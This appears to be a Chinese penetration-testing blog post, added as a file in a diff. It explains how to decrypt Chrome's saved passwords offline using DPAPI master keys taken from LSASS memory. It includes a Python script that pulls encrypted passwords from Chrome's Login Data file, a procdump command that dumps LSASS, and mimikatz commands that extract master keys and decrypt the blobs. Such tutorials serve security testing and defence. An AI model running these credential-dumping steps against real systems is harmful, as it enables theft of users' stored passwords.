@@ -1,0 +1,215 @@
+<article class="post">
+  <h1>渗透技巧——利用Masterkey离线导出Chrome浏览器中保存的密码</h1>
+
+  <div class="entry">
+    <h2 id="0x00-前言">0x00 前言</h2>
+<hr>
+
+<p>在之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E7%A6%BB%E7%BA%BF%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/">《渗透技巧——离线导出Chrome浏览器中保存的密码》</a>曾得出结论：<code class="language-plaintext highlighter-rouge">使用用户的ntlm hash，无法导出Chrome浏览器保存的明文密码</code>。</p>
+
+<p>而目前的Windows系统(如Windows Server 2012)，默认无法导出用户的明文口令，只能获得ntlm hash。</p>
+
+<p>也就是说，即使获得了系统的访问权限，如果无法获得明文口令，通过文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E7%A6%BB%E7%BA%BF%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/">《渗透技巧——离线导出Chrome浏览器中保存的密码》</a>介绍的方法还是无法离线(但可以在线)导出Chrome浏览器保存的明文密码。</p>
+
+<p>本文将要介绍一种新方法，利用Masterkey离线导出Chrome浏览器中保存的密码，不需要获得用户的明文口令，并且得出新的结论。</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr>
+
+<p>本文将要介绍以下内容：</p>
+
+<ul>
+  <li>基础概念</li>
+  <li>解密思路</li>
+  <li>导出方法</li>
+  <li>实际测试</li>
+</ul>
+
+<h2 id="0x02-基础概念">0x02 基础概念</h2>
+<hr>
+
+<h4 id="dpapi">DPAPI：</h4>
+
+<p>全称Data Protection Application Programming Interface</p>
+
+<h4 id="dpapi-blob">DPAPI blob：</h4>
+
+<p>一段密文，可使用Master Key对其解密</p>
+
+<h4 id="master-key">Master Key：</h4>
+
+<p>64字节，用于解密DPAPI blob，使用用户登录密码、SID和16字节随机数加密后保存在Master Key file中</p>
+
+<h4 id="master-key-file">Master Key file：</h4>
+
+<p>二进制文件，可使用用户登录密码对其解密，获得Master Key</p>
+
+<h2 id="0x03-dpapi解密思路">0x03 DPAPI解密思路</h2>
+<hr>
+
+<h3 id="1定位加密的master-key-file">1、定位加密的Master Key file</h3>
+
+<p>文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E7%A6%BB%E7%BA%BF%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/">《渗透技巧——离线导出Chrome浏览器中保存的密码》</a>曾得出结论：<code class="language-plaintext highlighter-rouge">无法定位解密Chrome数据库对应的Master Key file</code></p>
+
+<p>该结论有误，实际上能够对其定位，方法见0x04</p>
+
+<h3 id="2从lsass进程提取出master-key">2、从lsass进程提取出Master Key</h3>
+
+<p>此处换了一种思路，因此不需要用户的明文口令</p>
+
+<p><strong>注：</strong></p>
+
+<p>离线从Master Key file提取出Master Key，必须要获得用户的明文口令</p>
+
+<h3 id="3使用master-key解密dpapi-blob获得明文">3、使用Master Key解密DPAPI blob，获得明文</h3>
+
+<h2 id="0x04-实现方法">0x04 实现方法</h2>
+<hr>
+
+<p>测试系统：</p>
+
+<p>Win7 x86</p>
+
+<h3 id="1使用python读取数据库文件并提取出密文">1、使用python读取数据库文件并提取出密文</h3>
+
+<p>使用python脚本读取Login Data并保存到文件中，代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from os import getenv
+import sqlite3
+import binascii
+conn = sqlite3.connect("Login Data")
+cursor = conn.cursor()
+cursor.execute('SELECT action_url, username_value, password_value FROM logins')
+for result in cursor.fetchall():
+    print (binascii.b2a_hex(result[2]))
+    f = open('test.txt', 'wb')
+    f.write(result[2])
+    f.close()
+</code></pre></div></div>
+
+<p>脚本执行后，提取Login Data中保存的密文，保存为test.txt</p>
+
+<h3 id="2获得该密文对应的master-key-file">2、获得该密文对应的Master Key file</h3>
+
+<p>mimikatz命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dpapi::blob /in:test.txt
+</code></pre></div></div>
+
+<p>获得对应guidMasterkey为<code class="language-plaintext highlighter-rouge">{a111b0f6-b4d7-40c8-b536-672a8288b958}</code></p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-14/2-1.png" alt="Alt text"></p>
+
+<p>即Master Key file的路径为<code class="language-plaintext highlighter-rouge">%APPDATA%\Microsoft\Protect\%SID%\a111b0f6-b4d7-40c8-b536-672a8288b958</code></p>
+
+<h3 id="3从lsass进程提取出master-key">3、从lsass进程提取出Master Key</h3>
+
+<h4 id="1-在线方式">(1) 在线方式</h4>
+
+<p>需要管理员权限</p>
+
+<p>mimikatz:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>privilege::debug
+sekurlsa::dpapi
+</code></pre></div></div>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-14/2-2.png" alt="Alt text"></p>
+
+<p>提取出Master Key为<code class="language-plaintext highlighter-rouge">666638cbaea3b7cf1dc55688f939e50ea1002cded954a1d17d5fe0fbc90b7dd34677ac148af1f32caf828fdf7234bafbe14b39791b3d7e587176576d39c3fa70</code></p>
+
+<h4 id="2-离线方式">(2) 离线方式</h4>
+
+<p>使用procdump dump出LSASS进程内存</p>
+
+<p>procdump下载地址：</p>
+
+<p>https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</p>
+
+<p>管理员权限：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>procdump.exe -accepteula -ma lsass.exe lsass.dmp
+</code></pre></div></div>
+
+<p>使用mimikatz加载dmp文件：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sekurlsa::minidump lsass.dmp
+sekurlsa::dpapi
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>mimikatz从lsass进程提取出Master Key后，会自动将Master Key加入系统缓存</p>
+
+<h3 id="4使用masterkey解密">4、使用masterkey解密</h3>
+
+<p>mimikatz:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dpapi::blob /in test.txt
+</code></pre></div></div>
+
+<p>成功获得明文，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-14/2-3.png" alt="Alt text"></p>
+
+<p>数据正确，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-14/2-4.png" alt="Alt text"></p>
+
+<h2 id="0x05-利用分析">0x05 利用分析</h2>
+<hr>
+
+<p>本文介绍的方法是利用lsass进程还原出Master Key，因此不需要获取到用户的明文密码</p>
+
+<p>同时，配合procdump，不需要在测试系统上执行mimikatz，只需要获得目标系统的两个文件：lsass进程的dmp文件和Login Data文件，在本地使用mimikatz还原出Master Key，解密获得明文</p>
+
+<p>并且，不需要从System权限降权到当前用户权限</p>
+
+<p>综上，离线导出的完整思路如下：</p>
+
+<h4 id="1获得用户系统chrome保存密码的sqlite数据库文件位于localappdatagooglechromeuser-datadefaultlogin-data">1、获得用户系统Chrome保存密码的SQLite数据库文件，位于<code class="language-plaintext highlighter-rouge">%LocalAppData%\Google\Chrome\User Data\Default\Login Data</code></h4>
+
+<h4 id="2获得lsass进程的内存文件">2、获得lsass进程的内存文件</h4>
+
+<h4 id="3在本地使用mimikatz提取master-key解密login-data获得明文">3、在本地使用mimikatz提取Master Key，解密Login Data获得明文</h4>
+
+<h2 id="0x06-最终结论">0x06 最终结论</h2>
+<hr>
+
+<h3 id="1能够定位master-key-file">1、能够定位Master Key file</h3>
+
+<p>方法1:</p>
+
+<p>mimikatz命令：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dpapi::blob /in:test.txt
+</code></pre></div></div>
+
+<p>方法2：</p>
+
+<p>通过读取文件Preferred的前16字节获得对应的Master Key file</p>
+
+<h3 id="2不需要用户明文口令也能离线导出chrome浏览器中保存的密码">2、不需要用户明文口令也能离线导出Chrome浏览器中保存的密码</h3>
+
+<h2 id="0x07-小结">0x07 小结</h2>
+<hr>
+
+<p>本文介绍了如何利用Masterkey离线导出Chrome浏览器中保存的密码，相比于之前的方法，更加通用</p>
+
+<hr>
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+
+
+  </div>
+
+  <div class="date">
+    Written on February 14, 2018
+  </div>
+
+  
+</article>
